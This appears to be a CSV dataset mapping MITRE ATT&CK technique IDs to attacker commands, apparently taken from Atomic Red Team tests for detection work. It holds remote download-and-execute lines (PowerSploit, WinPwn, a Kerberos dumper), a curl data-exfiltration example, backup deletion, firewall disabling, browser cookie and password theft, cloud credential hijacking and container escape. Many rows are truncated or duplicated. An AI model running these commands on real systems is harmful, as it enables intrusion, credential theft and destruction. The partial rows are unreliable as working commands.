mitre_id,command
T1567,new-item var_211:test -v
T1016,test-netconnection -commontcpport smb -computername var_393
T1120,"get-wmiobject win32_pnpentity | format-table name, description, manufacturer > $env:temp\t1120_collection.txt $space,$heading,$break,$data = get-content $env:temp\t1120_collection.txt @($heading; $break; $data |sort-object -unique) | ? {$_.trim() -ne """" } |set-content $env:temp\t1120_collection.txt"
T1072,"""%programfiles(x86)%/#{radmin_exe}"""
T1197,bitsadmin.exe \create var_536
T1059,"cmd /c ""for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}"" | out-null"
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"""
T1606,"import-module  aadinternals  -force  $saml  =  new-aadintsamltoken  -immutableid  ""var_450  write-host  ""end  of  golden  saml"""
T1553,bcdedit \set testsigning on
T1132,echo  -n  111-11-1111  |  base64  curl  -xpost  var_503
T1530,"$storage_account_objects = import-csv -path ""var_177"
T1606,"import-module aadinternals -force $saml = new-aadintsamltoken -immutableid ""var_587 write-host ""end of golden saml"""
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe"""
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"""
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_976
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')"""
T1486,openssl enc var_694
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')"""
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_164\extension\"" -passthru"
T1648,"import-module ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1"" -force $access_key = ""var_148"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1197,bitsadmin.exe  \create  var_376
T1110,cd var_501
T1112,"reg add ""hklm\system\currentcontrolset\control\safeboot\minimal\atomicsafemode"" /ve /t reg_sz /f /d ""service"""
T1098,"$credfile = ""var_610"
T1652,lsmod
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_967
T1539,"stop-process  -name  ""firefox""  -force  -erroraction  silentlycontinue  $cookiedblocation  =  get-childitem  -path  ""$env:appdata\mozilla\firefox\profiles\*\cookies.sqlite""  ""select  host,  name,  value,  path,  expiry,  issecure,  ishttponly,  samesite  from  [moz_cookies];""  |  cmd  \c  var_309"""
T1490,wbadmin delete systemstatebackup -keepversions:0
T1497,ping  -c  var_819
T1550,"var_399"""
T1496,yes > \dev\null
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh
T1114,"powershell -executionpolicy bypass -command ""var_358"
T1195,"kubectl  run  var_190  --no-audit  --no-fund  --no-package-lock  &&  echo  '---  package.json  after  install  ---'  &&  cat  package.json"""
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f
T1095,"cmd  \c  ""var_516"
T1127,"copy ""var_723 \t:library %temp%\libhello.js"
T1613,podman build -t t1613 $pathtoatomicsfolder\t1613\src\ podman run --name t1613_container --rm -d -t t1613 podman ps podman stats --no-stream podman inspect $(podman ps -l -q --filter ancestor=t1613)
T1053,"systemd-run --user --unit=atomic-red-team --on-calendar '*:0\1' \bin\sh -c 'echo ""$(date) $(whoami)"" >>\tmp\log'"
T1216,"cscript.exe  \b  %systemroot%\system32\printing_admin_scripts\en-us\pubprn.vbs  localhost  ""script:var_428"""
T1528,"az  login  #  log  in  to  azure  cli  $allowsharedkeyaccess  =  az  storage  account  show  --name  ""var_733"
T1057,"start-process -filepath ""c:\temp\externalpayloads\pchunter_free\var_652"""
T1016,sudo defaults read /library/preferences/com.apple.alf sudo /usr/libexec/applicationfirewall/socketfilterfw --getglobalstate
T1484,"reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimedc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffsetdc /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtime /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v grouppolicyrefreshtimeoffset /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v enablesmartscreen /t reg_dword /d 0 /f reg add ""hklm\software\policies\microsoft\windows\system"" /v shellsmartscreenlevel /t reg_sz /d block /f"
T1046,nmap -pn -sv -p #{port_range} #{host}
T1580,aws ec2 describe-security-groups --profile var_446
T1220,"""var_709"""
T1562,iptables-save > /tmp/iptables.rules iptables -f
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_258"" net start sesshijack"
T1137,"reg add ""hkey_current_user\software\microsoft\office\16.0\outlook\security"" \v level \t reg_dword \d 1 \f mkdir %appdata%\microsoft\outlook\ >nul 2>&1 echo ""atomic red team test"" > %appdata%\microsoft\outlook\vbaproject.otm"
T1571,echo quit | telnet var_726 exit 0
T1114,"powershell -executionpolicy bypass -command ""var_766"
T1497,if (ioreg -l | grep -e manufacturer -e 'vendor name' | grep -ie 'oracle|virtualbox|vmware|parallels') then echo 'virtualization environment detected'; fi;
T1018,"([adsisearcher]""objectcategory=computer"").findall(); ([adsisearcher]""objectcategory=computer"").findone()"
T1201,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https:\\raw.githubusercontent.com\powershellmafia\powersploit\master\recon\powerview.ps1' -usebasicparsing); get-domainpolicy -verbose
T1505,"xcopy \i \y ""var_973"
T1005,"$startingdirectory = ""var_111"
T1530,aws  --no-sign-request  s3  cp  --recursive  s3:\\var_923
T1526,"import-module  ""pathtoatomicsfolder\t1526\src\awsdiscovery.ps1""  $access_key  =  ""var_832"""
T1611,"kubectl  --context  kind-atomic-cluster  run  atomic-nsenter-escape-pod  --restart=never  -ti  --rm  --image  alpine  --overrides  '{""spec"":{""hostpid"":  true,  ""containers"":[{""name"":""1"",""image"":""alpine"",""command"":[""nsenter"",""--mount=\proc\1\ns\mnt"",""--"",""\bin\bash""],""stdin"":  true,""tty"":true,""securitycontext"":{""privileged"":true}}]}}'"
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive)"
T1176,"#  chromium  $chromium  =  ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip""  #  ublock  origin  lite  to  test  side-loading  $extension  =  ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip""  set-location  ""var_729\extension\""  -passthru"
T1622,"#  check  for  common  debugger  processes  $debuggerprocesses  =  get-process  |  where-object  {  $_.processname  -match  ""dbg""  -or  $_.processname  -match  ""debug""  }  #  check  for  debugging  flags  $debuggingflags  =  [system.diagnostics.debugger]::isattached"
T1526,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azdomaininfo.ps1"" $password = convertto-securestring -string ""var_122"" -verbose"
T1106,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\get-system-techniques\master\namedpipe\namedpipesystem.ps1')
T1219,start-process var_388
T1620,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') mimiload -consoleoutput -noninteractive
T1497,"if [ ""$(system_profiler sphardwaredatatype | grep ""model identifier"" | grep -v 'mac')"" != """" ]; then echo 'virtualization environment detected'; fi;"
T1543,"echo ""#!\bin\bash"" > \etc\init.d\t1543.002 echo ""### begin init info"" >> \etc\init.d\t1543.002 echo ""# provides : atomic test t1543.002"" >> \etc\init.d\t1543.002 echo ""# required-start: \$all"" >> \etc\init.d\t1543.002 echo ""# required-stop : "" >> \etc\init.d\t1543.002 echo ""# default-start: 2 3 4 5"" >> \etc\init.d\t1543.002 echo ""# default-stop: "" >> \etc\init.d\t1543.002 echo ""# short description: atomic test for systemd service creation"" >> \etc\init.d\t1543.002 echo ""### end init info"" >> \etc\init.d\t1543.002 echo ""python3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibdcmvhdgluzybtexn0zw1kifnlcnzpy2ugvde1ndmumdayid4gl3rtcc9umtu0my4wmdiuc3lzdgvtzc5zzxj2awnllmnyzwf0aw9ujykk')) \"" "" >> \etc\init.d\t1543.002 chmod +x \etc\init.d\t1543.002 if [ $(cat \etc\os-release | grep -i id=ubuntu) ] || [ $(cat \etc\os-release | grep -i id=kali) ]; then update-rc.d t1543.002 defaults; elif [ $(cat \etc\os-release | grep -i 'id=""centos""') ]; then chkconfig t1543.002 on ; else echo ""please run this test on ubnutu , kali or centos"" ; fi systemctl enable t1543.002 systemctl start t1543.002 echo ""python3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibtb2rpznlpbmcgysbtexn0zw1kifnlcnzpy2ugvde1ndmumdayid4gl3rtcc9umtu0my4wmdiuc3lzdgvtzc5zzxj2awnllm1vzglmawnhdglvbicpcg=='))\"""" | sudo tee -a \etc\init.d\t1543.002 systemctl daemon-reload systemctl restart t1543.002"
T1098,"import-module -name azuread $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azuread -credential $credential > $null $app = get-azureadapplication -searchstring ""#{application_name}"" | select-object -first 1 if ($app -eq $null) { write-warning ""application not found""; exit } # in the context of an art test (and not a real attack), we don't need to keep access for too long. in case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long $crednotafter = (get-date).adddays(1) $certnotafter = (get-date).adddays(2) # certificate expiry must be later than cred expiry $cert = new-selfsignedcertificate -dnsname ""atomicredteam.example.com"" -friendlyname ""atomiccert"" -certstorelocation cert:\currentuser\my -keyexportpolicy exportable -provider ""microsoft enhanced rsa and aes cryptographic provider"" -notafter $certnotafter $keyvalue = [system.convert]::tobase64string($cert.getrawcertdata()) write-host ""generated certificate """"$($cert.thumbprint)"""""" new-azureadapplicationkeycredential -objectid $app.objectid -type asymmetricx509cert -customkeyidentifier ""atomictest"" -usage verify -value $keyvalue -enddate $crednotafter start-sleep -s 30 $tenant = get-azureadtenantdetail $auth = connect-azuread -tenantid $tenant.objectid -applicationid $app.appid -certificatethumbprint $cert.thumbprint write-host ""application hijacking worked. logged in successfully as $($auth.account.id) of type $($auth.account.type)"" write-host ""end of hijacking"""
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_238
T1564,"echo cmd \c echo ""shell code execution.""> var_778) do %i"
T1105,(new-object net.webclient).downloadstring('#{target_remote_file}') | out-file #{output_file}; invoke-item #{output_file}
T1112,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v hideclock /t reg_dword /d 1 /f"
T1106,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\get-system-techniques\master\createprocess\get-createprocesssystembind.ps1')
T1529,halt --reboot
T1219,"start-process -wait -filepath ""var_728"" -argument ""\silent"" -passthru start-process 'c:\program files (x86)\ultraviewer\ultraviewer_desktop.exe'"
T1053,"""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" \\#{target} -accepteula -s ""cmd.exe"" ""pathtoatomicsfolder\..\externalpayloads\ghosttask.exe"" \\#{target} add #{task_name} ""cmd.exe"" ""/c #{task_command}"" #{user_name} logon"
T1610,docker build -t t1610 $pathtoatomicsfolder\t1610\src\ docker run --name t1610_container --rm -itd t1610 bash \tmp\script.sh
T1221,"start ""var_533"""
T1543,sc.exe  create  var_741
T1057,tasklist | findstr var_856
T1574,"write-host ""creating system environment variables"" -foregroundcolor cyan new-itemproperty -path 'hklm:\system\currentcontrolset\control\session manager\environment' -name ""cor_enable_profiling"" -propertytype string -value ""1"" -force | out-null new-itemproperty -path 'hklm:\system\currentcontrolset\control\session manager\environment' -name ""cor_profiler"" -propertytype string -value ""var_320"" -force | out-null"
T1548,sudo -l sudo cat \etc\sudoers sudo vim \etc\sudoers
T1578,gcloud compute snapshots create var_990
T1220,"wmic  var_349"""
T1612,docker build -t t1612 $pathtoatomicsfolder\t1612\src\ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container .\test.sh
T1132,echo -n 111-11-1111 | b64encode -r - curl -xpost var_115
T1110,"@for  \f  %n  in  (%temp%\users.txt)  do  @echo  |  set\p=.  &  @net  use  %logonserver%\ipc$  \user:""%userdomain%\%n""  ""var_540  &&  @net  use  \delete  %logonserver%\ipc$  >  nul"
T1497,"if (systemd-detect-virt) then echo ""virtualization environment detected""; fi; if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -ie 'oracle|virtualbox|vmware|parallels') then echo ""virtualization environment detected""; fi;"
T1546,"new-itemproperty -path ""hklm:\software\microsoft\command processor"" -name ""autorun"" -value ""#{command}"" -propertytype ""string"""
T1648,"import-module ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1"" -force $access_key = ""var_416"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1105,var_690  -o  %temp%\allthethingsx64.dll
T1620,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') mimiload -consoleoutput -noninteractive
T1047,"wmic \node:""var_919%%'"" call uninstall"
T1036,"copy  ""var_697""  %temp%\t1036.007_masquerading.rtf.ps1  \y  %temp%\t1036.007_masquerading.docx.exe  %temp%\t1036.007_masquerading.pdf.exe  %temp%\t1036.007_masquerading.ps1.exe  %temp%\t1036.007_masquerading.xls.vbs  %temp%\t1036.007_masquerading.xlsx.vbs  %temp%\t1036.007_masquerading.png.vbs  %systemroot%\system32\windowspowershell\v1.0\powershell.exe  -file  %temp%\t1036.007_masquerading.doc.ps1  %systemroot%\system32\windowspowershell\v1.0\powershell.exe  -file  %temp%\t1036.007_masquerading.pdf.ps1  %systemroot%\system32\windowspowershell\v1.0\powershell.exe  -file  %temp%\t1036.007_masquerading.rtf.ps1"
T1614,curl -k var_876
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')"""
T1197,bitsadmin.exe /transfer /download /priority foreground #{remote_file} #{local_file}
T1039,copy  \\var_638
T1219,"start-process -wait -filepath ""var_328"" -argument ""\silent"" -passthru start-process 'c:\program files (x86)\ultraviewer\ultraviewer_desktop.exe'"
T1046,for port in {1..65535}; do (2>\dev\null echo >\dev\tcp\var_635\$port) && echo port $port is open ; done
T1216,"cscript.exe /b c:\windows\system32\printing_admin_scripts\en-us\pubprn.vbs localhost ""script:#{remote_payload}"""
T1580,aws ec2 describe-security-groups --profile var_810
T1048,"import-module ""var_353"
T1003,invoke-expression (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/mzhmo/powershellkerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')
T1040,tcpdump  -c  5  -nnni  var_270
T1105,"# check if the folder exists, create it if it doesn't $folderpath = ""var_813"
T1098,"$credfile = ""#{cred_file}"" if (test-path $credfile) { $cred = new-object -typename system.management.automation.pscredential -argumentlist $env:username, (get-content $credfile | convertto-securestring) if($cred.getnetworkcredential().password -eq ""#{new_password}""){ write-host -foregroundcolor yellow ""the new password is the same as the password stored in the credential file. please specify a different new password.""; exit -1 } try { $newpassword = convertto-securestring #{new_password} -asplaintext -force set-adaccountpassword -identity $env:username -oldpassword $cred.password -newpassword $newpassword } catch { $_.exception $errcode = $_.exception.errorcode write-host ""error code: $errcode"" if ($errcode -eq 86) { write-host -foregroundcolor yellow ""the stored password for the current user is incorrect. please run the prereq commands to set the correct credentials"" remove-item $credfile } exit $errcode } write-host -foregroundcolor cyan ""successfully changed the password to #{new_password}"" $newcred = new-object system.management.automation.pscredential ($env:username, $(convertto-securestring ""#{new_password}"" -asplaintext -force)) $newcred.password | convertfrom-securestring | out-file $credfile } else { write-host -foregroundcolor yellow ""you must store the password of the current user by running the prerequisite commands first"" }"
T1204,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1"" -usebasicparsing) invoke-maldoc -macrofile ""pathtoatomicsfolder\t1204.002\src\chromeexec-macrocode.txt"" -officeproduct ""word"" -sub ""execchrome"""
T1569,psexec.py  'var_976'
T1570,net use * 'var_181' '*:\'
T1014,sudo modprobe var_375
T1648,"import-module ""pathtoatomicsfolder\t1648\src\t1648-1\lambdaattack.ps1"" -force $access_key = ""var_278"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1648\src\t1648-1"" -terraformvariables @(""profile=t1648-1"", ""region=$region"") invoke-lambdaattack -awsprofile ""t1648-1"" -awsregion $region"
T1069,"net localgroup net localgroup ""administrators"""
T1496,yes > \dev\null
T1491,"echo  """"  |  ""var_236""  ""esxcli  system  welcomemsg  set  -m  'ransomware-notification'"""
T1036,"mkdir -p \tmp\atomic-test-t1036.006 cd \tmp\atomic-test-t1036.006 mkdir -p 'testdirwithspaceend ' [ ""$(uname)"" = 'freebsd' ] && \bin\echo ""#\!\bin\sh"" > ""testdirwithspaceend \init "" && echo 'echo ""print(\""running t1035.006 with space after filename to masquerade init\"")"" | python3.9' >> ""testdirwithspaceend \init "" && echo ""exit"" >> ""testdirwithspaceend \init "" || \usr\bin\echo -e ""%d\na\n#!\usr\bin\perl\nprint \""running t1035.006 with space after filename to masquerade init\\n\"";\nqx\cp \\usr\\bin\\perl 'init '\;\nqx\'.\\init ' -e 'sleep 5'\;\n.\nwq\n"" | ed 'testdirwithspaceend \init ' >\dev\null chmod +x 'testdirwithspaceend \init ' '.\testdirwithspaceend \init '"
T1570,new-smbmapping -remotepath 'var_970' 'z:\'
T1654,powershell -c {get-eventlog 'security' | where {$_.message -like '*system*'} | export-csv $env:temp\t1654_events.txt}
T1562,"new-itemproperty ""hklm:\software\policies\microsoft\windowsfirewall\domainprofile"" -name enablefirewall -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windowsfirewall\standardprofile"" -name enablefirewall -propertytype dword -value 0 -force"
T1217,get-childitem -path c:\users\ -filter bookmarks -recurse -erroraction silentlycontinue -force
T1112,set-itemproperty -force -path 'hklm:\system\currentcontrolset\control\securityproviders\wdigest' -name 'uselogoncredential' -value '1' -erroraction ignore
T1518,ps aux | egrep 'little\ snitch|cbosxsensorservice|falcond|nessusd|santad|cbdefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|blockblock|lulu'
T1110,"import-module -name azuread $passwords = ""var_534 write-host ""end of bruteforce"""
T1564,reg add hklm\software\microsoft\windows\currentversion\explorer\advanced \v showsuperhidden \t reg_dword \d 0 \f reg add hklm\software\microsoft\windows\currentversion\explorer\advanced \v hidden \t reg_dword \d 0 \f
T1087,ldapdomaindump -u var_291 -o \tmp\t1087
T1078,"cat \etc\passwd |grep nobody chsh --shell \bin\bash nobody usermod --password $(openssl passwd -1 nobody) nobody su -c ""whoami"" nobody"
T1007,schtasks /query /fo list /v
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_398"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1078,"dscl . -create /users/atomicuser dscl . -create /users/atomicuser usershell /bin/bash dscl . -create /users/atomicuser realname ""atomic user"" dscl . -create /users/atomicuser uniqueid 503 dscl . -create /users/atomicuser primarygroupid 503 dscl . -create /users/atomicuser nfshomedirectory /local/users/atomicuser dscl . -passwd /users/atomicuser mysecretpassword dscl . -append /groups/admin groupmembership atomicuser"
T1620,iex(new-object  net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1')  mimiload  -consoleoutput  -noninteractive
T1055,var_833
T1055,"start-process ""$pathtoatomicsfolder\t1055\bin\x64\redvanity.exe"" #{pid}"
T1014,"echo  var_274  |  tee  -a  \etc\ld.so.preload  \usr\local\bin\evil_script.py  localhost  -c  10  >\dev\null  &  pgrep  -l  evil_script.py  ||  echo  ""process  hidden"""
T1555,security import #{cert_export} -k
T1082,"import-module ""pathtoatomicsfolder\..\externalpayloads\azurestealth.ps1"" -force $password = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $password connect-azaccount -credential $credential connect-azuread -credential $credential scan-azureadmins -usecurrentcred"
T1082,"echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{cli_script}"""
T1016,sudo defaults read \library\preferences\com.apple.alf sudo \usr\libexec\applicationfirewall\socketfilterfw --getglobalstate
T1059,"add-content -path #{ads_file} -value 'write-host ""stream data executed""' -stream 'streamcommand' $streamcommand = get-content -path #{ads_file} -stream 'streamcommand' invoke-expression $streamcommand"
T1046,nmap  -pn  -sv  -p  var_925
T1110,"cd ""pathtoatomicsfolder\..\externalpayloads"" .\kerbrute.exe passwordspray --dc var_229 ""pathtoatomicsfolder\..\externalpayloads\passwordspray.txt"" password132"
T1216,"%systemroot%\system32\syncappvpublishingserver.vbs ""\n;var_765"""
T1091,"$removabledrives=@()  $removabledrives  =  get-wmiobject  -class  win32_logicaldisk  -filter  ""drivetype=2""  |  select-object  -expandproperty  deviceid  foreach  ($drive  in  $removabledrives)  {  write-host  ""removable  drive  found:""  $drive  new-item  -path  $drive\t1091test1.txt  -itemtype  ""file""  -force  -value  ""t1091  test  1  has  created  this  file  to  simulate  malware  spread  to  removable  drives.""  }"
T1115,echo get-process | clip get-clipboard | iex
T1555,"$passworddblocation = get-childitem -path ""$env:appdata\mozilla\firefox\profiles\*.default-release\"" cmd \c var_104"
T1201,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https:\\raw.githubusercontent.com\powershellmafia\powersploit\master\recon\powerview.ps1' -usebasicparsing); get-domainpolicy -verbose
T1030,cd  var_306
T1069,wmic group get name
T1614,dism.exe /online /get-intl
T1550,"var_451"""
T1014,sudo  modprobe  var_919
T1041,if(-not (test-path var_451 -method post -body $filecontent -disablekeepalive
T1216,set comspec=var_288 cscript %windir%\system32\manage-bde.wsf
T1654,wevtutil enum-logs
T1573,$server_ip = var_802
T1578,"aws ec2 create-snapshot --region var_678 --description ""atomic red team test snapshot"" --query ""snapshotid"" --output text"
T1012,reg.exe query hklm\system\currentcontrolset\control /v systemstartoptions
T1018,"for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo ""#{subnet}.$ip up"" || : ; done"
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.1376\ubolite_2024.11.25.1376.chromium.mv3.zip"" set-location ""var_963\extension\"" -passthru"
T1030,$file = [system.io.file]::openread(var_663 $file.close()
T1083,ls -recurse get-childitem -recurse gci -recurse
T1106,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\get-system-techniques\master\createprocess\get-createprocesssystem.ps1')
T1651,"import-module  ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1""  -force  $access_key  =  ""var_481""  set-awsauthentication  -accesskey  $access_key  -secretkey  $secret_key  -sessiontoken  $session_token  -awsprofile  $aws_profile  -awsregion  $region  invoke-terraform  -terraformcommand  init  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  apply  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")  invoke-ssmattack  -awsprofile  ""t1651-1""  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  invoke-terraform  -terraformcommand  destroy  -terraformdirectory  ""pathtoatomicsfolder\t1651\src\t1651-1""  -terraformvariables  @(""profile=t1651-1"",  ""region=$region"")"
T1570,new-smbmapping -remotepath 'var_621' 'z:\'
T1563,"query  user  sc.exe  create  sesshijack  binpath=  ""cmd.exe  \k  tscon  var_118""  net  start  sesshijack"
T1105,rsync -r var_165
T1039,"copy-item  -path  ""\\var_309"""
T1055,"$mypid = #{process_id} mavinject $mypid /injectrunning ""#{dll_payload}"" stop-process -processname notepad"
T1113,screencapture var_491
T1571,echo  quit  |  telnet  var_569  exit  0
T1531,passwd var_974 #enter admin password > enter new password > confirm new password
